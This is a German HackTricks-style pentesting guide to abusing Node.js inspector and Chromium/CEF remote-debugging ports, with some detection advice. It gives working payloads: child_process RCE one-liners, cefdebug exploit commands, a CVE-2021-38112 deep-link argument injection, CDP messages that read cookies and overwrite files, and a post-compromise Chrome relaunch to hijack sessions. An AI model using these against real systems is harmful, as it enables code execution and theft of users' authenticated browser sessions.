# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Zu den historischen Praxisbeispielen zählen der Multimaster-Walkthrough und der Debugger-Angriff auf Visual Studio Code CVE-2019-1414. Nutze sie als versionsspezifischen Kontext, statt davon auszugehen, dass jedes aktuelle Electron- oder Chromium-Ziel dieselben Funktionen bereitstellt.<sup>[[1]](#references)[[3]](#references)</sup>

## Grundlegende Informationen

[Aus der Dokumentation](https://nodejs.org/learn/getting-started/debugging): Wird ein Node.js-Prozess mit dem Schalter `--inspect` gestartet, wartet er auf eine Verbindung durch einen Debugging-Client. **Standardmäßig** lauscht er auf Host und Port **`127.0.0.1:9229`**. Jedem Prozess wird außerdem eine **eindeutige** **UUID** zugewiesen.<sup>[[4]](#references)</sup>

Inspector-Clients benötigen Host-Adresse, Port und UUID, um eine Verbindung herzustellen, und müssen diese angeben. Eine vollständige URL sieht etwa so aus: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Da der **Debugger vollständigen Zugriff auf die Node.js-Ausführungsumgebung hat**, kann ein böswilliger Akteur, der eine Verbindung zu diesem Port herstellen kann, möglicherweise beliebigen Code im Namen des Node.js-Prozesses ausführen (**mögliche Rechteausweitung**).<sup>[[4]](#references)</sup>

Es gibt mehrere Möglichkeiten, einen Inspector zu starten:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Wenn du einen untersuchten Prozess startest, erscheint etwa Folgendes:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Prozesse auf Basis von **CEF** (**Chromium Embedded Framework**) können mit `--remote-debugging-port=9222` einen Debugger bereitstellen. Dadurch wird der Browser über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) statt über einen Node.js-Inspector zugänglich, sodass Node.js-`process`-basierte Payloads standardmäßig nicht direkt anwendbar sind.<sup>[[2]](#references)[[5]](#references)</sup>

Wenn du einen Browser mit aktiviertem Debugging startest, erscheint etwa Folgendes:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Einen CDP-Endpunkt enumerieren und steuern

Die HTTP-Discovery-Endpunkte unterscheiden den **Browser**-WebSocket von den WebSockets einzelner **Targets** (Tab, Worker, Extension usw.). Fragen Sie `/json/version` für den Browser-Endpunkt und `/json/list` für Targets ab; die zurückgegebenen `webSocketDebuggerUrl`-Werte lassen sich dann direkt mit den JSON-RPC-ähnlichen Nachrichten von CDP steuern.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Zum Beispiel kannst du dich mit `websocat "$BROWSER_WS"` verbinden und `{"id":1,"method":"Target.getTargets"}` oder `{"id":2,"method":"Storage.getCookies"}` senden. Bei einem Page-Target (`websocat "$PAGE_WS"`) wird `Runtime.evaluate` im zugehörigen Renderer ausgeführt und `Page.captureScreenshot` gibt einen base64-codierten Screenshot zurück. `document.cookie` kann keine `HttpOnly`-Cookies anzeigen, während `Storage.getCookies` den Browser nach seinem Cookie-Speicher fragt.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Browser, WebSockets und Same-Origin-Policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites, die in einem Webbrowser geöffnet sind, können gemäß dem Browser-Sicherheitsmodell WebSocket- und HTTP-Anfragen senden. Eine **initiale HTTP-Verbindung** ist erforderlich, um eine **eindeutige Debugger-Sitzungs-ID zu erhalten**. Die **Same-Origin-Policy** **verhindert**, dass Websites **diese HTTP-Verbindung** herstellen können. Als zusätzliche Sicherheitsmaßnahme gegen [**DNS-Rebinding-Angriffe**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** überprüft Node.js, ob die **„Host“-Header** der Verbindung genau eine **IP-Adresse** oder **`localhost`** angeben.<sup>[[4]](#references)</sup>

> [!TIP]
> Diese **Sicherheitsmaßnahmen verhindern, den Inspector auszunutzen**, um Code auszuführen, indem **einfach eine HTTP-Anfrage gesendet wird** (was durch Ausnutzen einer SSRF-Schwachstelle möglich wäre).<sup>[[4]](#references)</sup>

### Inspector in laufenden Prozessen starten

Du kannst das **Signal SIGUSR1** an einen laufenden Node.js-Prozess senden, damit dieser den **Inspector** am Standardport startet. Beachte jedoch, dass du über ausreichende Berechtigungen verfügen musst. Dadurch erhältst du möglicherweise **privilegierten Zugriff auf Informationen im Prozess**, aber keine direkte Privilege Escalation.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Dies ist in Containern nützlich, da **das Herunterfahren des Prozesses und das Starten eines neuen Prozesses** mit `--inspect` **keine Option** ist, weil der **Container** zusammen mit dem Prozess **beendet** wird.<sup>[[6]](#references)</sup>

### Mit dem Inspector/Debugger verbinden

Um eine Verbindung zu einem **Chromium-basierten Browser** herzustellen, können die URLs `chrome://inspect` oder `edge://inspect` für Chrome bzw. Edge aufgerufen werden. Durch Klicken auf die Schaltfläche „Configure“ sollte sichergestellt werden, dass **Zielhost und -port** korrekt aufgeführt sind. Das Bild zeigt ein Remote-Code-Execution-Beispiel (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Danach wird eine URL für den Zugriff auf den Debugger angezeigt, z. B. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d – Mit dem Inspector/Debugger verbinden: Um eine Verbindung zu einem Chromium-basierten Browser herzustellen, ...](<../../images/image (674).png>)

Über die **Befehlszeile** können Sie eine Verbindung zu einem Debugger/Inspector herstellen:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Das Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) ermöglicht es, **lokal laufende Inspector zu finden** und **Code in sie einzuschleusen**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Beachte, dass **NodeJS-RCE-Exploits nicht funktionieren**, wenn du über das [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) mit einem Browser verbunden bist (du musst die API prüfen, um interessante Anwendungsmöglichkeiten zu finden).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE im NodeJS-Debugger/Inspector

> [!TIP]
> Wenn du hier gelandet bist, weil du wissen möchtest, wie du [**über ein XSS in Electron RCE erhältst, schau dir bitte diese Seite an.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Einige gängige Möglichkeiten, **RCE** zu erreichen, wenn du dich mit einem Node-**Inspector** **verbinden** kannst, sind beispielsweise (es sieht so aus, als würde das **bei einer Verbindung über das Chrome DevTools Protocol nicht funktionieren**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads des Chrome DevTools Protocol

Die API findest du hier: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In diesem Abschnitt liste ich einfach interessante Dinge auf, mit denen andere dieses Protokoll ausgenutzt haben.

### Einschränkung für das Standardprofil ab Chrome 136

Ab **Chrome 136** ignoriert Chrome `--remote-debugging-port` und `--remote-debugging-pipe`, wenn sie auf das **standardmäßige Chrome-Datenverzeichnis** verweisen. Die Option muss mit einem nicht standardmäßigen `--user-data-dir` kombiniert werden. Dessen separater Verschlüsselungsschlüssel und isolierter Browserstatus verhindern, dass diese einfache flag-basierte Technik das normale authentifizierte Profil des Benutzers offenlegt. Es sollte nicht ohne Überprüfung angenommen werden, dass diese Chrome-spezifische Einschränkung auch für ältere Chrome-Versionen, Chrome for Testing, Electron-/CEF-Anwendungen oder andere Chromium-Derivate gilt.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Daher beweist ein aktueller Chrome-Prozess, der nur mit `--remote-debugging-port` gestartet wurde, **nicht**, dass CDP aktiv wurde. Prüfe den Listener und `/json/version` und ermittle, welches Profil tatsächlich dahintersteht.<sup>[[14]](#references)</sup>

### Parameter-Injektion über Deep Links

Bei [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) entdeckte Rhino Security, dass eine auf CEF basierende Anwendung eine benutzerdefinierte UR**I** im System registrierte (workspaces://index.html), die die vollständige URI erhielt und anschließend die auf CEF basierende Anwendu**ng** mit einer Konfiguration startete, die teilweise aus dieser URI erstellt wurde.<sup>[[8]](#references)</sup>

Es wurde entdeckt, dass die URI-Parameter URL-dekodiert und zum Starten der CEF-basierten Anwendung verwendet wurden. Dadurch konnte ein Benutzer das Flag **`--gpu-launcher`** in die **Befehlszeile** einschleusen und beliebige Befehle ausführen.<sup>[[8]](#references)</sup>

Ein Payload wie dieser:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Will führt calc.exe aus.<sup>[[8]](#references)</sup>

### Dateien überschreiben

Ändere den Ordner, in dem **heruntergeladene Dateien gespeichert werden**, und lade eine Datei herunter, um häufig verwendeten **Quellcode** der Anwendung mit deinem **bösartigen Code** zu **überschreiben**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE und Exfiltration

STAR Labs zeigte, dass offengelegte WebDriver/CDP-Dienste beliebige Dateien auslesen und RCE ermöglichen können; DNS rebinding kann die Exploit-Kette bei bestimmten Konfigurationen vervollständigen.<sup>[[9]](#references)</sup>

Der WebDriver-Dienst von ChromeDriver ist von Chrome DevTools/CDP getrennt. Die [`goog:chromeOptions.binary`-Capability](https://developer.chrome.com/docs/chromedriver/capabilities) legt fest, welche Browser-Executable für eine neue Session gestartet wird. Kann ein nicht privilegierter Aufrufer einen als root laufenden ChromeDriver-Dienst erreichen und eine Session mit einem vom Aufrufer kontrollierten Executable-Pfad anfordern, kann dieser Start die Privilegiengrenze des Dienstes überschreiten. Eine leere `/sessions`-Antwort klärt nicht, ob neue Sessions erstellt werden können. Prüfe Prozesseigentümer, tatsächliche Erreichbarkeit des Listeners, Session-Autorisierung, Zugriff auf die Executable und Einschränkungen, bevor du zu dem Schluss kommst, dass der Pfad nutzbar ist; allein ein Prozessname oder der üblicherweise verwendete Port reichen nicht aus. [Googles Sicherheitshinweise](https://developer.chrome.com/docs/chromedriver/security-considerations) empfehlen, ChromeDriver unter einem nicht privilegierten Konto auszuführen. Passive Enumeration sollte keine WebDriver-Session erstellen.

Weitere historische Fälle zu Browser-Automatisierung und Chromium-Sicherheit findest du im Counter-WebDriver-Write-up und in den Project-Zero-Issues 773, 1742 und 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### CDP in einem laufenden Chromium-Prozess aktivieren

Unter Windows zeigte [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler), dass die Beschränkung über die Kommandozeile nicht der einzige Weg ist, CDP zu aktivieren: Code, der bereits in einen vorhandenen `msedge.exe`-Prozess injiziert werden kann, kann Chromiums nicht exportierte Funktion `content::DevToolsAgentHost::StartRemoteDebuggingServer` aufrufen und das authentifizierte Live-Profil ohne Neustart des Browsers offenlegen.<sup>[[15]](#references)</sup>

Die demonstrierte Kette injiziert eine DLL mit `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, löst interne Edge-Symbole auf (zuerst über PDBs und anschließend mit versionsspezifischen Byte-Signaturen), subclassed das Browserfenster und sendet eine Nachricht, damit der abschließende Aufruf zum Starten des Servers im **UI-Thread** des Browsers ausgeführt wird. Der Socket wird an die Loopback-Schnittstelle gebunden. Danach können reguläre CDP-Primitives Cookies abrufen, Tabs erfassen, Netzwerkverkehr untersuchen oder JavaScript auf authentifizierten Seiten ausführen.<sup>[[15]](#references)</sup>

> [!WARNING]
> Dies ist eine **Post-Compromise-/Prozessinjektions**-Technik, kein unauthentifizierter Netzwerk-Bypass. Sie ist stark von der Build-Version abhängig, da die betreffenden C++-Symbole nicht exportiert werden und sich Signaturen nach Browser-Updates ändern können.<sup>[[15]](#references)</sup>

Verlass dich bei der Erkennung nicht nur auf Telemetrie zu `--remote-debugging-*`-Kommandozeilenargumenten: Setze auch ungewöhnliche Handles und Speicheroperationen in Browserprozessen (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, Thread-Erstellung), DLL-Injektionen und unerwartete Loopback-Listening-Sockets im Besitz von Chrome/Edge zueinander in Beziehung.<sup>[[15]](#references)</sup>

### Post-Exploitation

In einer realen Umgebung und **nach der Kompromittierung** eines Benutzer-PCs mit einem Chromium-basierten Browser bestand eine historische Technik darin, den Browser mit aktiviertem Debugging neu zu starten und den Loopback-Port weiterzuleiten. Dies kann den Browserstatus des Opfers auf Produkten und Builds offenlegen, die das ausgewählte Profil noch akzeptieren; Chrome 136+ lässt dies jedoch nicht für sein Standarddatenverzeichnis zu.<sup>[[7]](#references)[[14]](#references)</sup>

Der ursprüngliche Neustartbefehl ist unten für ältere bzw. versionsspezifische Ziele aufgeführt. Der zweite Befehl ist die unterstützte Form für aktuelle Chrome-Versionen, erstellt jedoch ein isoliertes Profil, anstatt den normalen authentifizierten Zustand des Opfers erneut zu öffnen.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Für macOS-spezifisches Chromium-Relaunch-, Extension- und CDP-Tradecraft siehe [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium-Debugger-Inspektions- und Exploitation-Tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution in Visual Studio Code über den Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js-Debugging-Leitfaden - Erste Schritte](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome-Debugging-Funktion missbrauchen, um Browsing-Sitzungen aus der Ferne zu beobachten und zu steuern](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution in AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Du sprichst mit mir? - WebDriver RCE über DNS-Rebinding und CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [WebDriver kontern - Vom Bot zu RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium-Bugtracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Änderungen an Remote-Debugging-Schaltern zur Verbesserung der Sicherheit - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [CDP in einen laufenden Edge-Browser injizieren: Ein tiefer Einblick in die Instrumentierung der Browser-Laufzeit](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
